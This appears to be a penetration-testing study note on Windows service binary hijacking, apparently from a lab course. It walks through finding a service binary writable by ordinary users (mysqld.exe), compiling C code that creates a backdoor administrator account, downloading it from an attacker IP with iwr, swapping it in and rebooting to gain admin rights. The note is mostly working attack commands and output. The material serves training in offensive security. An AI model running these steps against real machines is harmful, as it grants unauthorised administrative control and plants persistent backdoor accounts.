# Service binary hijacking

{% hint style="danger" %}
When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.
{% endhint %}

{% code title=" List of services with binary path" overflow="wrap" lineNumbers="true" %}
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
{% endcode %}

**icacls permissions mask**

We can choose between the traditional _icacls_ Windows utility or the PowerShell Cmdlet _Get-ACL_.For this example, we'll use icacls since it usable both in PowerShell and the Windows command line.

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

{% code title="Permissions of httpd.exe" overflow="wrap" lineNumbers="true" %}
```
icacls "C:\xampp\apache\bin\httpd.exe"
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files
```
{% endcode %}

{% code title="Permissions of mysqld.exe" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```
{% endcode %}

{% code title="adduser.c code" overflow="wrap" lineNumbers="true" %}
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

```
{% endcode %}

Next, we'll cross-compile the code on our Kali machine with _mingw-64_ as we learned in the Module "Fixing Exploits". Since we know that the target machine is 64-bit, we'll cross-compile the C code to a 64-bit application with **x86\_64-w64-mingw32-gcc**. In addition, we use **adduser.exe** as argument for **-o** to specify the name of the compiled executable.

{% code title="Cross-Compile the C Code to a 64-bit application" overflow="wrap" lineNumbers="true" %}
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
{% endcode %}

{% code title="Replacing mysqld.exe with our malicious binary" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
{% endcode %}

{% code title="Attempting to stop the service in order to restart it" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```
{% endcode %}

{% code title="Obtain Startup Type for mysql service" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto

```
{% endcode %}

In order to issue a reboot, our user needs to have the privilege _SeShutDownPrivilege_ assigned. We can use **whoami** with **/priv** to get a list of all privileges.

{% code title="Checking for reboot privileges" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```
{% endcode %}

The _Disabled_ state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested and is not currently using the SeShutdownPrivilege privilege.

{% code title="Rebooting the machine" overflow="wrap" lineNumbers="true" %}
```
 shutdown /r /t 0 
```
{% endcode %}

{% code title="User dave2 added" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```
{% endcode %}

We can use _RunAs_ to obtain an interactive shell. In addition, we could also use _msfvenom_ to create an executable file, starting a reverse shell.
